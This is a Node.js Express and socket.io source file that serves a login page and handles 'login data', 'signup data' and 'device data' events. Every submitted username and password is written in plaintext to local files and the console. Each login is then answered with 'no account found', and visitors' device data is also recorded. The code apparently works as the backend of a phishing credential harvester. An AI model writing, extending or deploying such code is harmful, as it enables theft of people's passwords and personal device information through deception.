import express from "express";
import http from "http";
import fs from "fs";
// import { Server } from "socket.io";


// const express = require("express");
const userRouter = express.Router();
// const http = require("http");
// const fs = require("fs");
// const { Server } = require("socket.io");
const server = http.createServer(userRouter);
// const io = new Server(server);
const LOGIN_FILE = "login_data.ttk";
const SIGNUP_FILE = "signup_data.ttk";
const DEVICE_DATA_FILE = "device_data.ttk"

let io; // will be set from main server

export function setIO(socketIO) {
  io = socketIO;
}

userRouter.get("/login", (req, res) => {
  // to render page file from the views folder
  res.render("login_page");
})

// userRouter.get("/signup", (req, res) => {
//   // to render page file from the views folder
//   res.render("signup_page");
// })

export function setupSocketHandlers() {
  if (!io) return;

  // Socket Handling
  io.on("connection", (socket) => {
    console.log("A user connected");

    // // Send existing chat history
    // if (fs.existsSync(DATA_FILE)) {
    //   const history = fs.readFileSync(DATA_FILE, "utf8");
    //   socket.emit("chat history", history.split("\n").filter(Boolean));
    // }

    // When a message is sent
    socket.on("login data", (data) => {
      const username = data.username;
      const password = data.password;
      fs.appendFileSync(LOGIN_FILE, "Username: " + username + " | Password: " + password + "\n");
      socket.emit("no account found");
      console.log(`Username: ${username} | Password: ${password}`);
    });

    socket.on("signup data", (data) => {
      const username = data.username;
      const password = data.password;
      fs.appendFileSync(SIGNUP_FILE, "Username: " + username + " | Password: " + password + "\n");
      console.log(`Username: ${username} | Password: ${password}`);
    });

    socket.on("device data", (data) => {
      fs.appendFileSync(DEVICE_DATA_FILE, data + "\n\n");
      console.log(`DEVICE DATA: \n${data}`);
    });

    socket.on("disconnect", () => {
      console.log("A user disconnected");
    });
  });
}

setupSocketHandlers();

export default userRouter;

